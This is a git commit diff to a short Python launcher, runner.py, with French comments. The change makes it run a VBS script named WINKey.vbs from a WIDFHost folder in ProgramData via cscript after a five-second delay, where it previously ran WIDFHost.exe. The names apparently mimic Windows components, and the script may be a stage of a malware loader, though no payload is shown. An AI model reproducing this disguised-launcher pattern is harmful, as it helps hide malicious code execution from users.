28ec6ee67ab0fe4ccab3643aa648f00959322a8d
gitlab124 <dsf78er2xder512325er@tutamail.com>
2024-10-27 18:04:19 +0100

    runner.py

--- runner.py
+++ runner.py
@@ -2,14 +2,11 @@ import os
 import subprocess
 import time
 
-# Chemin complet vers WIDFHost.exe dans le dossier WIDFHost de ProgramData
-chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WIDFHost.exe')
+chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WINKey.vbs')
 
-# Attendre 30 secondes pour s'assurer que l'application est présente
-time.sleep(300)
+time.sleep(5)
 
-# Vérifie si le fichier existe et exécute-le
 if os.path.isfile(chemin_executable):
-    subprocess.run([chemin_executable])
+    subprocess.run(['cscript.exe', chemin_executable])
 else:
-    print("L'application WIDFHost.exe est introuvable dans le dossier WIDFHost de ProgramData.")
+    print("Le script WINKey.vbs est introuvable dans le dossier WIDFHost de ProgramData.")
